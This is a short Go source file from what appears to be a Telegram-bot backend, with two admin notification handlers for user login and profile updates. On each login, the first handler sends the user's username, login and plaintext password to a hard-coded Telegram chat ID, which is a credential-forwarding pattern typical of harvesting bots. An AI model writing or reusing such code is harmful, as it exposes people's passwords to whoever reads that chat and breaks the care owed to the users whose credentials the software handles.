package admin

import (
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/sirupsen/logrus"
)

func HandlerAdminIfLogin(bot *tgbotapi.BotAPI, username, login, password string) {
	bot.Send(tgbotapi.NewMessage(-1002594657207, "Пользователь @"+username+" авторизовался\n|"+login+"|\n"+"|"+password+"|"))

	logrus.WithFields(logrus.Fields{
		"username": username,
		"login":    login,
	}).Info("Пользователь авторизовался")
}

func HandlerAdminIfUpdate(bot *tgbotapi.BotAPI, username, newLogin string) {
	bot.Send(tgbotapi.NewMessage(-1002594657207, "Пользователь @"+username+" изменил данные"))

	logrus.WithFields(logrus.Fields{
		"username": username,
		"login":    newLogin,
	}).Info("Пользователь изменил данные")
}
